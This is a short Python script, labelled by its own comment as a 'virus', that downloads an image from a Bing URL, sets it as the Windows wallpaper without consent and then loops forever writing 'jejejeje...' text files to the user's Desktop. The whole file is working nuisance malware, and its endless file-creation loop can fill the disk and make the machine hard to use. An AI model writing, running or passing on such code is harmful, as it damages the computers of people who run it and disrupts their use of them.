#This virus will create a lot of files and change the wallpaper
import ctypes
import requests
import os

username = os.getlogin()
remote_url = "https://th.bing.com/th/id/OIP.dIt990FdleDX8tNkHqHvWAHaEK?rs=1&pid=ImgDetMain"

local_file = f"C:\\Users\\{username}\\bob.jpg"

imagen = requests.get(remote_url).content
with open(local_file, 'wb') as handler:
    handler.write(imagen)


SPI_SETDESKWALLPAPER = 20
desktopPath = f"C:\\Users\\{username}\\Desktop\\"




def cambiar_fondo(ruta_imagen):
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, ruta_imagen, 3)

cambiar_fondo(local_file)

i = 0
while True:
	with open(f'{desktopPath}je{i}.txt', 'w') as file:
		file.write('jejejeje...')
	i += 1